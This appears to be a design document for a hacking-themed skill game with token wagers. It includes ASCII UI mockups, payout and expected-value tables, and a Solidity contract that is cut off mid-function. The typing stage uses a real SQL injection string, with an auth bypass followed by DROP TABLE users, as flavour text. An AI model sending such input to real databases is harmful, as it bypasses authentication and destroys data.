# ZERO DAY

## Game Design Document

**Category:** Skill (Multi-discipline)  
**Phase:** 3C (Deep Engagement)  
**Complexity:** High  
**Development Time:** 3 weeks  

---

## Overview

ZERO DAY is a multi-stage exploit chain puzzle where players attempt to breach a virtual system through a sequence of distinct skill challenges. Each stage tests a different ability - typing speed, reaction time, pattern recognition, memory, and decision-making. Complete the chain without failing any stage to extract maximum rewards. The deeper you go, the higher the stakes.

```
╔══════════════════════════════════════════════════════════════════╗
║                          ZERO DAY                                ║
║                   EXPLOIT CHAIN IN PROGRESS                      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  TARGET: ████████ MEGACORP MAINFRAME ████████                    ║
║                                                                   ║
║  CHAIN PROGRESS:                                                  ║
║  ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐     ║
║  │ ███ │──▶│ ███ │──▶│ ░░░ │──▶│     │──▶│     │──▶│ $$$ │     ║
║  │ ✓   │   │ ✓   │   │ >>> │   │     │   │     │   │     │     ║
║  └─────┘   └─────┘   └─────┘   └─────┘   └─────┘   └─────┘     ║
║  INJECT    CRACK     MEMORY    BYPASS    EXFIL    EXTRACT       ║
║                      ▲ ACTIVE                                    ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  STAGE 3: MEMORY DUMP                    TIME: 00:12.47          ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │                                                             │  ║
║  │   ┌───┐ ┌───┐ ┌───┐ ┌───┐ ┌───┐ ┌───┐ ┌───┐ ┌───┐       │  ║
║  │   │ A │ │ 7 │ │ F │ │ 2 │ │ ? │ │ ? │ │ ? │ │ ? │       │  ║
║  │   └───┘ └───┘ └───┘ └───┘ └───┘ └───┘ └───┘ └───┘       │  ║
║  │                                                             │  ║
║  │   MEMORIZE THE SEQUENCE... 3 REVEALED, 5 HIDDEN            │  ║
║  │                                                             │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  CURRENT MULTIPLIER: 2.4x          POTENTIAL: 240 $DATA          ║
║                                                                   ║
║              [ ABORT & EXTRACT @ 2.4x ]                          ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## Core Mechanics

### Game Flow

```
1. TARGET SELECTION
   └── Choose difficulty (determines stage count + multiplier)
   └── Entry fee locked (100 $DATA, 100% burned)

2. EXPLOIT CHAIN (4-6 stages depending on difficulty)
   └── Each stage is a different skill challenge
   └── Complete stage = advance + increase multiplier
   └── Fail stage = chain broken, lose everything
   └── Optional: Abort early to extract current multiplier

3. EXTRACTION
   └── Complete all stages = full payout at max multiplier
   └── Abort early = partial payout at current multiplier
   └── Fail any stage = entry burned, no payout
```

### Difficulty Tiers

| Difficulty | Stages | Base Multiplier | Max Multiplier | Time Pressure |
|------------|--------|-----------------|----------------|---------------|
| SCRIPT KIDDIE | 4 | 1.0x | 2.5x | Relaxed |
| GREY HAT | 5 | 1.2x | 4.0x | Moderate |
| BLACK HAT | 6 | 1.5x | 8.0x | Intense |

### Multiplier Progression

```
SCRIPT KIDDIE (4 stages):
Stage 1: 1.0x → Stage 2: 1.4x → Stage 3: 1.8x → Stage 4: 2.5x

GREY HAT (5 stages):
Stage 1: 1.2x → Stage 2: 1.6x → Stage 3: 2.2x → Stage 4: 3.0x → Stage 5: 4.0x

BLACK HAT (6 stages):
Stage 1: 1.5x → Stage 2: 2.0x → Stage 3: 2.8x → Stage 4: 4.0x → Stage 5: 5.5x → Stage 6: 8.0x
```

---

## Stage Types

### Stage 1: INJECTION (Typing Speed)

Type the SQL/code injection payload before the firewall detects you.

```
╔══════════════════════════════════════════════════════════════════╗
║  STAGE 1: CODE INJECTION                     TIME: 00:08.23      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  > INJECT PAYLOAD TO BYPASS AUTH                                 ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │                                                             │  ║
║  │  ' OR '1'='1' --; DROP TABLE users; SELECT * FROM          │  ║
║  │                                                             │  ║
║  │  ' OR '1'='1' --; DROP TABLE u█                            │  ║
║  │                              ▲                              │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  DETECTION LEVEL: ████████░░░░░░░░░░░░ 42%                       ║
║                                                                   ║
║  WPM: 78        ACCURACY: 94%        ERRORS: 2                   ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║  ⚠ DETECTION @ 100% = STAGE FAILED                              ║
╚══════════════════════════════════════════════════════════════════╝
```

**Mechanics:**
- Detection meter rises over time
- Typing errors accelerate detection
- Must complete before 100% detection
- Difficulty scales: longer payloads, faster detection

**Requirements by Difficulty:**
| Difficulty | Payload Length | Detection Rate | Required WPM |
|------------|---------------|----------------|--------------|
| SCRIPT KIDDIE | 40 chars | Slow | 40+ |
| GREY HAT | 70 chars | Medium | 60+ |
| BLACK HAT | 100 chars | Fast | 80+ |

---

### Stage 2: CRACK (Reaction Time)

Break through encryption by clicking weak points as they appear.

```
╔══════════════════════════════════════════════════════════════════╗
║  STAGE 2: ENCRYPTION CRACK                   TIME: 00:15.00      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  > BREAK ENCRYPTION NODES                                        ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │                                                             │  ║
║  │     ╔═══╗                              ╔═══╗               │  ║
║  │     ║ ▓ ║         ╔═══╗                ║   ║               │  ║
║  │     ║   ║         ║ ● ║ ← CLICK NOW    ║   ║               │  ║
║  │     ╚═══╝         ╚═══╝                ╚═══╝               │  ║
║  │                                                             │  ║
║  │  ╔═══╗                    ╔═══╗                            │  ║
║  │  ║   ║        ╔═══╗       ║ ▓ ║                            │  ║
║  │  ║   ║        ║   ║       ║   ║                            │  ║
║  │  ╚═══╝        ╚═══╝       ╚═══╝                            │  ║
║  │                                                             │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  NODES CRACKED: 7/12        MISSES: 1/3 allowed                  ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

**Mechanics:**
- Nodes light up briefly (● = active)
- Click active nodes before they deactivate
- Miss 3 nodes = stage failed
- Nodes appear faster as you progress

**Requirements by Difficulty:**
| Difficulty | Nodes | Window | Max Misses |
|------------|-------|--------|------------|
| SCRIPT KIDDIE | 8 | 1.5s | 3 |
| GREY HAT | 12 | 1.0s | 3 |
| BLACK HAT | 16 | 0.7s | 2 |

---

### Stage 3: MEMORY DUMP (Pattern Memory)

Memorize and reproduce a sequence of characters/symbols.

```
╔══════════════════════════════════════════════════════════════════╗
║  STAGE 3: MEMORY DUMP                        TIME: 00:05.00      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  > MEMORIZING DECRYPTION KEY...                                  ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │                                                             │  ║
║  │              ╔═══════════════════════════╗                 │  ║
║  │              ║  A  7  F  2  9  B  3  E  ║                 │  ║
║  │              ╚═══════════════════════════╝                 │  ║
║  │                                                             │  ║
║  │              MEMORIZE THIS SEQUENCE                        │  ║
║  │                                                             │  ║
║  │                  HIDING IN: 3...                           │  ║
║  │                                                             │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║  HINT: Sequence will be hidden, then you must reproduce it      ║
╚══════════════════════════════════════════════════════════════════╝
```

**Then (after hiding):**

```
╔══════════════════════════════════════════════════════════════════╗
║  STAGE 3: MEMORY DUMP                        TIME: 00:12.34      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  > ENTER DECRYPTION KEY                                          ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │                                                             │  ║
║  │              YOUR INPUT:                                    │  ║
║  │              ╔═══════════════════════════╗                 │  ║
║  │              ║  A  7  F  _  _  _  _  _  ║                 │  ║
║  │              ╚═══════════════════════════╝                 │  ║
║  │                        ▲                                   │  ║
║  │                                                             │  ║
║  │   [ 0 ] [ 1 ] [ 2 ] [ 3 ] [ 4 ] [ 5 ] [ 6 ] [ 7 ]        │  ║
║  │   [ 8 ] [ 9 ] [ A ] [ B ] [ C ] [ D ] [ E ] [ F ]        │  ║
║  │                                                             │  ║
║  │                    [ BACKSPACE ]                           │  ║
║  │                                                             │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  ATTEMPTS: 0/2                                                   ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

**Mechanics:**
- Sequence displayed for limited time
- Player must reproduce from memory
- Limited attempts allowed
- Sequence length increases with difficulty

**Requirements by Difficulty:**
| Difficulty | Sequence Length | View Time | Attempts |
|------------|----------------|-----------|----------|
| SCRIPT KIDDIE | 6 chars | 5s | 3 |
| GREY HAT | 8 chars | 4s | 2 |
| BLACK HAT | 10 chars | 3s | 2 |

---

### Stage 4: BYPASS (Pattern Matching)

Navigate through a firewall by matching patterns in real-time.

```
╔══════════════════════════════════════════════════════════════════╗
║  STAGE 4: FIREWALL BYPASS                    TIME: 00:20.00      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  > MATCH PACKET SIGNATURES TO BYPASS                             ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │                                                             │  ║
║  │   INCOMING PACKET:          YOUR RESPONSE:                  │  ║
║  │                                                             │  ║
║  │      ┌─────────┐              ┌─────────┐                  │  ║
║  │      │ ██  ░░  │              │ ??  ??  │                  │  ║
║  │      │ ░░  ██  │              │ ??  ??  │                  │  ║
║  │      └─────────┘              └─────────┘                  │  ║
║  │                                                             │  ║
║  │   PATTERN OPTIONS:                                          │  ║
║  │                                                             │  ║
║  │   [1]         [2]         [3]         [4]                 │  ║
║  │   ██  ░░      ░░  ██      ██  ██      ░░  ░░             │  ║
║  │   ░░  ██      ██  ░░      ░░  ░░      ██  ██             │  ║
║  │                                                             │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  PACKETS MATCHED: 8/15        STREAK: 5        ERRORS: 1/3       ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

**Mechanics:**
- Patterns scroll in, must select matching response
- Speed increases over time
- Wrong matches count as errors
- Too slow = automatic error

**Requirements by Difficulty:**
| Difficulty | Patterns | Initial Speed | Max Errors |
|------------|----------|---------------|------------|
| SCRIPT KIDDIE | 10 | 3s/pattern | 4 |
| GREY HAT | 15 | 2s/pattern | 3 |
| BLACK HAT | 20 | 1.5s/pattern | 3 |

---

### Stage 5: EXFILTRATE (Decision Speed)

Rapidly sort data packets into correct categories before they expire.

```
╔══════════════════════════════════════════════════════════════════╗
║  STAGE 5: DATA EXFILTRATION                  TIME: 00:25.00      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  > SORT PACKETS TO CORRECT CHANNELS                              ║
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │                                                             │  ║
║  │              INCOMING PACKET:                               │  ║
║  │                                                             │  ║
║  │              ╔═════════════════╗                           │  ║
║  │              ║   CREDENTIAL    ║                           │  ║
║  │              ║   usr:admin     ║                           │  ║
║  │              ║   ████████████  ║  ← EXPIRES IN 1.2s        │  ║
║  │              ╚═════════════════╝                           │  ║
║  │                                                             │  ║
║  │  ─────────────────────────────────────────────────────────  │  ║
║  │                                                             │  ║
║  │  [1] CREDS      [2] KEYS       [3] LOGS      [4] TRASH     │  ║
║  │      █████          █████          █████         █████     │  ║
║  │                                                             │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  SORTED: 12/20        EXPIRED: 1        WRONG: 0                 ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

**Packet Types:**
- `CREDENTIAL` → CREDS channel
- `SSH_KEY` / `API_KEY` → KEYS channel
- `ACCESS_LOG` / `ERROR_LOG` → LOGS channel
- `JUNK_DATA` / `DECOY` → TRASH channel

**Mechanics:**
- Packets appear with countdown timer
- Press 1-4 to sort to channel
- Wrong sort = error
- Expired packet = error

**Requirements by Difficulty:**
| Difficulty | Packets | Time per Packet | Max Errors |
|------------|---------|-----------------|------------|
| SCRIPT KIDDIE | 15 | 2.5s | 4 |
| GREY HAT | 20 | 2.0s | 3 |
| BLACK HAT | 25 | 1.5s | 3 |

---

### Stage 6: EXTRACT (Execution Under Pressure) - BLACK HAT ONLY

Final boss stage combining multiple skills simultaneously.

```
╔══════════════════════════════════════════════════════════════════╗
║  STAGE 6: CRITICAL EXTRACTION                TIME: 00:30.00      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  ⚠ SECURITY ALERT - EXTRACTION REQUIRED ⚠                       ║
║                                                                   ║
║  ┌─────────────────────────┬──────────────────────────────────┐  ║
║  │  ENCRYPT OUTPUT:        │  SYSTEM INTEGRITY:                │  ║
║  │                         │                                    │  ║
║  │  > Type: "EXTRACT_"     │  ████████████░░░░░░░░ 62%         │  ║
║  │  > EXTRACT_█            │                                    │  ║
║  │                         │  CLICK ALERTS TO DISMISS:         │  ║
║  ├─────────────────────────┤                                    │  ║
║  │  VERIFY SEQUENCE:       │    ╔═══╗         ╔═══╗           │  ║
║  │                         │    ║ ! ║         ║   ║           │  ║
║  │  ┌───┬───┬───┬───┐     │    ╚═══╝         ╚═══╝           │  ║
║  │  │ 3 │ 7 │ ? │ ? │     │                                    │  ║
║  │  └───┴───┴───┴───┘     │         ╔═══╗                     │  ║
║  │                         │         ║ ! ║ ← URGENT            │  ║
║  │  Enter: [ _ ]           │         ╚═══╝                     │  ║
║  │                         │                                    │  ║
║  └─────────────────────────┴──────────────────────────────────┘  ║
║                                                                   ║
║  MULTI-TASK: Type + Click Alerts + Remember Sequence            ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

**Mechanics:**
- Must complete typing challenge
- While clicking security alerts that pop up
- While memorizing a sequence shown briefly
- System integrity drains if alerts not clicked
- All three must succeed to pass

**Fail Conditions:**
- System integrity reaches 0%
- Typing not completed in time
- Sequence entered incorrectly

---

## Abort Mechanic

Players can abort the chain early to secure partial winnings:

```
╔══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                    ABORT EXPLOIT CHAIN?                           ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  CURRENT PROGRESS: Stage 3 of 6                                  ║
║  CURRENT MULTIPLIER: 2.8x                                        ║
║                                                                   ║
║  ABORT NOW:                                                       ║
║  • Extract 280 $DATA (2.8x of 100 entry)                         ║
║  • Net Profit: +180 $DATA                                        ║
║                                                                   ║
║  CONTINUE:                                                        ║
║  • Risk losing 100 $DATA entry                                   ║
║  • Potential: up to 800 $DATA (8.0x)                             ║
║  • Next stage: FIREWALL BYPASS                                   ║
║                                                                   ║
║         [ ABORT & EXTRACT ]         [ CONTINUE CHAIN ]           ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## User Interface

### Target Selection Screen

```
╔══════════════════════════════════════════════════════════════════╗
║                          ZERO DAY                                ║
║                    SELECT YOUR TARGET                            ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  ┌────────────────────────────────────────────────────────────┐  ║
║  │                                                             │  ║
║  │   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐       │  ║
║  │   │ SCRIPT      │  │ GREY HAT    │  │ BLACK HAT   │       │  ║
║  │   │ KIDDIE      │  │             │  │             │       │  ║
║  │   │             │  │             │  │             │       │  ║
║  │   │ 4 Stages    │  │ 5 Stages    │  │ 6 Stages    │       │  ║
║  │   │ Max: 2.5x   │  │ Max: 4.0x   │  │ Max: 8.0x   │       │  ║
║  │   │             │  │             │  │             │       │  ║
║  │   │ Relaxed     │  │ Moderate    │  │ Intense     │       │  ║
║  │   │ Pressure    │  │ Pressure    │  │ Pressure    │       │  ║
║  │   │             │  │             │  │             │       │  ║
║  │   │ [ SELECT ]  │  │ [ SELECT ]  │  │ [ SELECT ]  │       │  ║
║  │   └─────────────┘  └─────────────┘  └─────────────┘       │  ║
║  │                                                             │  ║
║  └────────────────────────────────────────────────────────────┘  ║
║                                                                   ║
║  ENTRY FEE: 100 $DATA (burned on start)                          ║
║  YOUR BALANCE: 1,847 $DATA                                       ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║  RECENT ATTEMPTS:                                                 ║
║  0x7a3f completed BLACK HAT @ 8.0x [+700 $DATA]                  ║
║  0x9c2d failed GREY HAT at Stage 4                               ║
║  0x3b1a aborted SCRIPT KIDDIE @ 1.8x [+80 $DATA]                 ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

### Stage Briefing Screen

```
╔══════════════════════════════════════════════════════════════════╗
║  ZERO DAY                              GREY HAT - Stage 3        ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║                    STAGE BRIEFING: MEMORY DUMP                    ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  OBJECTIVE:                                                       ║
║  Memorize the decryption key sequence, then reproduce it         ║
║  from memory after it's hidden.                                  ║
║                                                                   ║
║  PARAMETERS:                                                      ║
║  • Sequence Length: 8 characters (hex)                           ║
║  • View Time: 4 seconds                                          ║
║  • Attempts Allowed: 2                                           ║
║                                                                   ║
║  TIPS:                                                            ║
║  • Group characters into pairs                                   ║
║  • Look for patterns (ascending, repeating)                      ║
║  • Use the input delay to verify before submitting              ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  CURRENT MULTIPLIER: 1.6x → AFTER THIS STAGE: 2.2x              ║
║                                                                   ║
║        [ READY - START STAGE ]        [ ABORT @ 1.6x ]           ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

### Stage Complete Screen

```
╔══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                   ░░░ STAGE 3 COMPLETE ░░░                       ║
║                                                                   ║
║                       MEMORY DUMP                                 ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  TIME: 12.4 seconds                                               ║
║  ATTEMPTS USED: 1/2                                               ║
║  RATING: ★★★☆☆ (GOOD)                                            ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  CHAIN PROGRESS:                                                  ║
║  ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐               ║
║  │ ███ │──▶│ ███ │──▶│ ███ │──▶│     │──▶│ $$$ │               ║
║  │  ✓  │   │  ✓  │   │  ✓  │   │     │   │     │               ║
║  └─────┘   └─────┘   └─────┘   └─────┘   └─────┘               ║
║                                                                   ║
║  MULTIPLIER: 1.6x → 2.2x                                         ║
║  POTENTIAL PAYOUT: 220 $DATA                                     ║
║                                                                   ║
║  NEXT: FIREWALL BYPASS                                           ║
║                                                                   ║
║       [ CONTINUE CHAIN ]           [ ABORT @ 2.2x ]              ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

### Chain Complete Screen (Victory)

```
╔══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ███████╗███████╗██████╗  ██████╗     ██████╗  █████╗ ██╗   ██╗ ║
║   ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔══██╗██╔══██╗╚██╗ ██╔╝ ║
║     ███╔╝ █████╗  ██████╔╝██║   ██║    ██║  ██║███████║ ╚████╔╝  ║
║    ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██║  ██║██╔══██║  ╚██╔╝   ║
║   ███████╗███████╗██║  ██║╚██████╔╝    ██████╔╝██║  ██║   ██║    ║
║   ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ║
║                                                                   ║
║                    EXPLOIT CHAIN COMPLETE                         ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  TARGET: BLACK HAT                                                ║
║  STAGES COMPLETED: 6/6                                            ║
║  TOTAL TIME: 2:34.78                                              ║
║                                                                   ║
║  ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐     ║
║  │ ███ │──▶│ ███ │──▶│ ███ │──▶│ ███ │──▶│ ███ │──▶│ ███ │     ║
║  │  ✓  │   │  ✓  │   │  ✓  │   │  ✓  │   │  ✓  │   │  ✓  │     ║
║  └─────┘   └─────┘   └─────┘   └─────┘   └─────┘   └─────┘     ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  ENTRY: 100 $DATA                                                ║
║  MULTIPLIER: 8.0x                                                ║
║  PAYOUT: 800 $DATA                                               ║
║  NET PROFIT: +700 $DATA                                          ║
║                                                                   ║
║               [ PLAY AGAIN ]        [ EXIT ]                     ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

### Chain Failed Screen

```
╔══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║              ████  EXPLOIT CHAIN BROKEN  ████                    ║
║                                                                   ║
║                    SECURITY DETECTED YOU                          ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  FAILED AT: Stage 4 - FIREWALL BYPASS                            ║
║  REASON: Too many pattern mismatches                             ║
║                                                                   ║
║  ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐               ║
║  │ ███ │──▶│ ███ │──▶│ ███ │──▶│ ░░░ │   │     │               ║
║  │  ✓  │   │  ✓  │   │  ✓  │   │  ✗  │   │     │               ║
║  └─────┘   └─────┘   └─────┘   └─────┘   └─────┘               ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║                                                                   ║
║  ENTRY: 100 $DATA (burned)                                       ║
║  MULTIPLIER REACHED: 2.2x                                        ║
║  PAYOUT: 0 $DATA                                                 ║
║  NET LOSS: -100 $DATA                                            ║
║                                                                   ║
║  TIP: You could have aborted at 2.2x for +120 $DATA profit      ║
║                                                                   ║
║               [ TRY AGAIN ]         [ EXIT ]                     ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## Economic Model

### Entry & Fees

| Parameter | Value |
|-----------|-------|
| Entry Fee | 100 $DATA |
| Burn Rate | 100% of entry (burned immediately) |
| Prize Source | Contract reserve (funded by overall protocol) |

### Payout Structure

```
ENTRY: 100 $DATA (always burned)

SCRIPT KIDDIE (4 stages):
├── Abort after Stage 1: 100 * 1.0x = 100 $DATA (break even)
├── Abort after Stage 2: 100 * 1.4x = 140 $DATA (+40)
├── Abort after Stage 3: 100 * 1.8x = 180 $DATA (+80)
└── Complete all stages: 100 * 2.5x = 250 $DATA (+150)

GREY HAT (5 stages):
├── Abort after Stage 1: 100 * 1.2x = 120 $DATA (+20)
├── Abort after Stage 2: 100 * 1.6x = 160 $DATA (+60)
├── Abort after Stage 3: 100 * 2.2x = 220 $DATA (+120)
├── Abort after Stage 4: 100 * 3.0x = 300 $DATA (+200)
└── Complete all stages: 100 * 4.0x = 400 $DATA (+300)

BLACK HAT (6 stages):
├── Abort after Stage 1: 100 * 1.5x = 150 $DATA (+50)
├── Abort after Stage 2: 100 * 2.0x = 200 $DATA (+100)
├── Abort after Stage 3: 100 * 2.8x = 280 $DATA (+180)
├── Abort after Stage 4: 100 * 4.0x = 400 $DATA (+300)
├── Abort after Stage 5: 100 * 5.5x = 550 $DATA (+450)
└── Complete all stages: 100 * 8.0x = 800 $DATA (+700)
```

### Expected Value Analysis

```
Assumptions (skilled player):
- Stage completion rate: 85% per stage
- Abort decision: Optimal (abort when low confidence)

SCRIPT KIDDIE (4 stages):
- P(complete all): 0.85^4 = 52.2%
- P(fail): 47.8%
- EV if always continue: (0.522 * 250) + (0.478 * 0) - 100 = +30.5 $DATA

GREY HAT (5 stages):
- P(complete all): 0.85^5 = 44.4%
- EV if always continue: (0.444 * 400) + (0.556 * 0) - 100 = +77.6 $DATA

BLACK HAT (6 stages):
- P(complete all): 0.85^6 = 37.7%
- EV if always continue: (0.377 * 800) + (0.623 * 0) - 100 = +201.6 $DATA

CONCLUSION: Higher difficulty = higher EV for skilled players
            Abort option reduces variance at cost of EV
```

### Leaderboard Rewards (Weekly)

| Rank | Reward |
|------|--------|
| #1 | 500 $DATA + "Zero Day Master" title |
| #2-3 | 250 $DATA |
| #4-10 | 100 $DATA |

Leaderboard ranking based on:
1. Highest difficulty completed
2. Fastest total time
3. Number of completions

---

## Technical Implementation

### Smart Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable2Step.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/// @title ZeroDay
/// @notice Multi-stage exploit chain puzzle game for GHOSTNET
/// @dev Entry fees are burned, payouts come from contract reserve
contract ZeroDay is Ownable2Step, ReentrancyGuard {
    using SafeERC20 for IERC20;

    // ═══════════════════════════════════════════════════════════════
    // TYPES
    // ═══════════════════════════════════════════════════════════════

    enum Difficulty { SCRIPT_KIDDIE, GREY_HAT, BLACK_HAT }
    enum ChainState { INACTIVE, IN_PROGRESS, COMPLETED, FAILED, ABORTED }
    
    struct ExploitChain {
        address player;
        Difficulty difficulty;
        ChainState state;
        uint8 currentStage;
        uint8 totalStages;
        uint256 entryAmount;
        uint256 startTime;
        uint256 lastStageTime;
        bytes32 sessionHash;  // For verification
    }
    
    struct DifficultyConfig {
        uint8 stageCount;
        uint16 baseMultiplierBps;   // 100 = 1.0x
        uint16 maxMultiplierBps;    // 800 = 8.0x
        uint16[] stageMultipliers;  // Multiplier after each stage
    }

    // ═══════════════════════════════════════════════════════════════
    // STATE
    // ═══════════════════════════════════════════════════════════════

    IERC20 public immutable dataToken;
    address public immutable burnAddress;
    
    uint256 public constant ENTRY_FEE = 100 ether;  // 100 $DATA
    uint256 public constant MAX_STAGE_DURATION = 5 minutes;
    
    mapping(address => ExploitChain) public activeChains;
    mapping(Difficulty => DifficultyConfig) public difficultyConfigs;
    
    uint256 public totalBurned;
    uint256 public totalPaidOut;
    uint256 public totalAttempts;
    uint256 public totalCompletions;

    // ═══════════════════════════════════════════════════════════════
    // EVENTS
    // ═══════════════════════════════════════════════════════════════

    event ChainStarted(
        address indexed player,
        Difficulty difficulty,
        bytes32 sessionHash,
        uint256 timestamp
    );
    
    event StageCompleted(
        address indexed player,
        uint8 stage,
        uint16 multiplierBps,
        uint256 timestamp
    );
    
    event ChainCompleted(
        address indexed player,
        Difficulty difficulty,
        uint16 finalMultiplierBps,
        uint256 payout,
        uint256 totalTime
    );
    
    event ChainAborted(
        address indexed player,
        uint8 atStage,
        uint16 multiplierBps,
        uint256 payout
    );
    
    event ChainFailed(
        address indexed player,
        uint8 atStage,
        Difficulty difficulty
    );

    // ═══════════════════════════════════════════════════════════════
    // ERRORS
    // ═══════════════════════════════════════════════════════════════

    error ChainAlreadyActive();
    error NoActiveChain();
    error InvalidStageProof();
    error StageTimeout();
    error InsufficientReserve();
    error InvalidDifficulty();

    // ═══════════════════════════════════════════════════════════════
    // CONSTRUCTOR
    // ═══════════════════════════════════════════════════════════════

    constructor(
        address _dataToken,
        address _burnAddress,
        address _initialOwner
    ) Ownable(_initialOwner) {
        dataToken = IERC20(_dataToken);
        burnAddress = _burnAddress;
        
        _initializeDifficultyConfigs();
    }
    
    function _initializeDifficultyConfigs() internal {
        // SCRIPT_KIDDIE: 4 stages, max 2.5x
        uint16[] memory skMultipliers = new uint16[](4);
        skMultipliers[0] = 100;  // 1.0x
        skMultipliers[1] = 140;  // 1.4x
        skMultipliers[2] = 180;  // 1.8x
        skMultipliers[3] = 250;  // 2.5x
        
        difficultyConfigs[Difficulty.SCRIPT_KIDDIE] = DifficultyConfig({
            stageCount: 4,
            baseMultiplierBps: 100,
            maxMultiplierBps: 250,
            stageMultipliers: skMultipliers
        });
        
        // GREY_HAT: 5 stages, max 4.0x
        uint16[] memory ghMultipliers = new uint16[](5);
        ghMultipliers[0] = 120;  // 1.2x
        ghMultipliers[1] = 160;  // 1.6x
        ghMultipliers[2] = 220;  // 2.2x
        ghMultipliers[3] = 300;  // 3.0x
        ghMultipliers[4] = 400;  // 4.0x
        
        difficultyConfigs[Difficulty.GREY_HAT] = DifficultyConfig({
            stageCount: 5,
            baseMultiplierBps: 120,
            maxMultiplierBps: 400,
            stageMultipliers: ghMultipliers
        });
        
        // BLACK_HAT: 6 stages, max 8.0x
        uint16[] memory bhMultipliers = new uint16[](6);
        bhMultipliers[0] = 150;  // 1.5x
        bhMultipliers[1] = 200;  // 2.0x
        bhMultipliers[2] = 280;  // 2.8x
        bhMultipliers[3] = 400;  // 4.0x
        bhMultipliers[4] = 550;  // 5.5x
        bhMultipliers[5] = 800;  // 8.0x
        
        difficultyConfigs[Difficulty.BLACK_HAT] = DifficultyConfig({
            stageCount: 6,
            baseMultiplierBps: 150,
            maxMultiplierBps: 800,
            stageMultipliers: bhMultipliers
        });
    }

    // ═══════════════════════════════════════════════════════════════
    // EXTERNAL FUNCTIONS
    // ═══════════════════════════════════════════════════════════════

    /// @notice Start a new exploit chain
    /// @param difficulty The difficulty level to attempt
    function startChain(Difficulty difficulty) external nonReentrant {
        if (activeChains[msg.sender].state == ChainState.IN_PROGRESS) {
            revert ChainAlreadyActive();
        }
        
        DifficultyConfig storage config = difficultyConfigs[difficulty];
        if (config.stageCount == 0) revert InvalidDifficulty();
        
        // Transfer and burn entry fee
        dataToken.safeTransferFrom(msg.sender, burnAddress, ENTRY_FEE);
        totalBurned += ENTRY_FEE;
        totalAttempts++;
        
        // Generate session hash for verification
        bytes32 sessionHash = keccak256(abi.encodePacked(
